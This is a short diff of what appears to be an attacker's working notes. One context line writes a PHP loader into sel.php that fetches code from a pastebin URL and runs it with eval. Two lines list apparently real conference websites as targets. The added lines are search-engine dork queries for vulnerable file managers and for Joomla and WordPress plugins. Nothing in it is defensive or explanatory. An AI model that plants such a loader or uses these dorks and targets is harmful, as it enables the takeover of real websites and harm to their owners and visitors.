@@ -4,3 +4,13 @@
 echo '<?php eval("?>".file_get_contents("https://pastebin.com/raw/CurQrH1a")); ?>' > sel.php
 https://conf.healthtech.ca//scripts/
 http://conference.asumidsouth.edu/scripts/
+inurl:"/course/jumpto.php?jump="
+intitle:"elFinder 2.1.x"
+inurl:"laravel-filemanager?type=Files" -site:github.com -site:github.io
+inurl:''/index.php?option=com_rsform''
+inurl:api/DownloadUrlResponse.ashx?url=
++"Public" +"My Conferences" +"Personal Library" +"My Profile" +19.49.5200.0
+inurl:''/wp-content/plugins/topcsstools/"
+inurl:''/index.php?option=com_b2jcontact''
+intext:''POWERED BY VISUALPROJECT WEB''
+"IFM - improved file manager"
